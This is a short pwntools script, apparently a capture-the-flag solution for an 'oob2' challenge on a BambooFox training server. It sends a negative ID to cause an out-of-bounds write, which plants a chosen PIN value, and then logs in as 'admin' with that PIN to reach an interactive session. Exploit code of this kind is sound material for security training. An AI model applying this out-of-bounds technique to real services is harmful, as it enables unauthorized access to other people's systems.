from pwn import *

# r = process('./oob2')
r = remote('bamboofox.cs.nctu.edu.tw', 12012)

r.recvuntil('ID: ')

r.sendline('-4')

r.recvuntil('name: ')

r.sendline('0000000')

r.recvuntil('PIN: ')

r.sendline('1234')

r.recvuntil('ID: ')

r.sendline('0')

r.recvuntil('name: ')

r.sendline('admin')

r.recvuntil('PIN: ')

r.sendline('808464432')

r.recv(4096)

r.interactive()
